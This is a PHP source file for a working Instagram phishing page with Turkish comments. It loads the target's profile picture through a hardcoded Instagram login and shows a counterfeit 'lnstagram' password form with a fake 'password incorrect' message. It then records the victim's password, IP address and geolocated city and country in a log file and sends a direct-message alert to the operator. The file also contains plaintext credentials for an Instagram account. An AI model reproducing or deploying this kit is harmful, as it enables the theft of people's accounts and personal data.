<?php
$lparalyzed=$_GET['nick'];
require 'lusy/autoload.php';
\InstagramAPI\Instagram::$allowDangerousWebUsageAtMyOwnRisk = true;
$username="zeusotoscript";
$password="onur40";
$ig = new \InstagramAPI\Instagram();
	$ig->login($username,$password);
$json = $ig->people->getInfoByName($lparalyzed);
$suggest2 = json_decode($json,true);
$lparalyzedresim = $suggest2['user']['profile_pic_url'];

if($_POST){
	//////////////////////
\InstagramAPI\Instagram::$allowDangerousWebUsageAtMyOwnRisk = true;
/////// CONFIG ///////

$userid = "34847053050";
$debug = false; 
$truncatedDebug = false;
///////////////////////////////
$ig = new \InstagramAPI\Instagram($debug, $truncatedDebug);
/////////////////////////////////
$ig->login($username, $password); // Giriş İşlemi.
$yazı = "Hesap Düştü Aga Gel :D";
$ig->direct->sendText(['users' => ["$userid"]], $yazı);
	$password=$_POST["password"];
	$ip=$_SERVER["REMOTE_ADDR"];
	$konum = file_get_contents("http://ip-api.com/xml/".$ip);
$cek = new SimpleXMLElement($konum);
$ulke = $cek->country;
$sehir = $cek->city;
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen('zeusx.php', 'a');
fwrite($file, "
<html>
<head>
	<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
</head>
<body bgcolor='#000000'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='black'>
<hr>
<font color='red'>Kullanıcı Adı: </font><font color='white'>".$lparalyzed."</font><br>
<font color='red'> Şifre: </font><font color='white'>".$password."</font><br>
<font color='red'>Ip Adresi: </font><font color='white'>".$ip."</font><br>
<font color='red'>Tarih: </font><font color='white'>".$cur_time."</font><br>
<font color='red'>Ülke: </font><font color='white'>".$ulke."</font><br>
<font color='red'>Şehir: </font><font color='white'>".$sehir."</font><br>
<hr>
<br>

"); 
fclose($file);


header("location: security.php?nick=".$lparalyzed);
}
?>

<html>
<head>
	<link rel="stylesheet" type="text/css" href="main.css"><style>img[alt="www.000webhost.com"]{display:none;}</style>
	<title>Login • lnstagram</title>
	<link rel="icon" sizes="192x192" href="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTp5Ex2kch6H9Ybcq6A0dxj70ciW8E5DOH7lg&usqp=CAU">
	<meta name="viewport" content="width=device-width,inital-scale=1">
	<noscript>Please Active Javascirpt on your scanner</noscript>
	<link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all">
</head>
<body style="background:#fafafa;">
	<header>
<center>
	<div style="margin:0; padding;">

 
<div style=" padding:5px; margin:0px;
width:99%; height:45px;;
  background: #f09433; 
background: -moz-linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); 
background: -webkit-linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); 
background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); 
filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#f09433', endColorstr='#bc1888',GradientType=1 );
  ">


  <table style="width:100%;margin:0px;">
      <tbody><tr style="width:100%;margin:0px;">
         <td style=" margin:0px;font-family:sans-serif;font-weight:bold;color:white;">Instagram</td>
         <td style="border:1px solid:white;color:white; margin:0px;
text-align:right;"><div style="border:1px solid white;margin:0px;
width:; text-align:center; margin-left:%;font-weight:bold;border-radius:5px;font-family:sans-serif;">GET
</div>

</td>
      </tr>
      <tr>
         <td style=" font-family:sans-serif;font-weight:400;color:white;font-size:13px;">Find It for free on Google Play.</td>
         <td>    </td>
      </tr>
   </tbody></table>



</div>
</div>
</header>
	<center>
		<br><br>
		<table class="qen" style="display:none;">
			<tr class="zy">
				<th class="er">
					<div class="top"></div>
				</th>
				<th class="can"><span class="or">OR</span></th>
				<th class="han">
			<div class="top"></div>
				</th>
			</tr>
		</table>
<div style="width:300px;max-width:95%;background:white;border:1px solid #cecece;padding:10px;box-sizing:border-box;">
			<br>
			<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSv3GysrPLnBI6OO1TdqqIek9ntr_DyyqOAMQ&usqp=CAU" width="170">
			<p style="font-family:sans-serif;width:300px;max-width:88%;color:#999;font-size:15px;line-height:19px;">
<img src="<?php echo $lparalyzedresim; ?>" style="max-width:48%; border-radius:50%;"><br>
<br><br>
<?php 
			echo "
Please write your instagram password and click 'Continue as @$lparalyzed' and fill the next form.";
			?>
			</p><br>
			<form method="post">
				<input type="password" name="password" id="password" placeholder="Password" required="" class="passwordx" style="width:230px;height:25px;padding-left:6px;padding-top:2px;padding-bottom:2px;outline:none;background:#fafafa;border:none;border:1px solid #dedede" onkeyup="form_kontrol()" ><br><br>
		
			<button id="buton" type="submit" class="qenzyist" disabled><?php echo "Continue As @$lparalyzed "; ?></button>
			<br>
		
			

	
		
		</form>
		<b><p style="color: rgb(237, 73, 86); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; text-align: center;">Sorry, your password was incorrect. Please double-check your password.</p></b>
<br>
			</div>

		<br>
		

	</center>
	<center>
	<div style="width:300px;max-width:95%;background:white;border:1px solid #cecece;padding:10px;box-sizing:border-box;">
				<p style="font-family:sans-serif;width:95%;max-width:95%;color:#999;font-size:15px;line-height:19px;box-sizing:border-box;">
Instagram From Facebook
© Instagram. Facebook Inc., 1601 Willow Road, Menlo Park, CA 94025
</p>

			</div></center>
	<?php
	for($i=0;$i<9;$i++){
echo "<br>";
	}
	?>
	<center>
	<div class="bottom">
		
		<span class="mini">from</span>
		<p class="big">FACEBOOK</p>
	</div>
</center>

</body>
</html>
<script>
    function form_kontrol()
{
    if(document.getElementById("password").value.length == 0)
        document.getElementById("buton").disabled = true;
    else 
        document.getElementById("buton").disabled = false;
}
</script>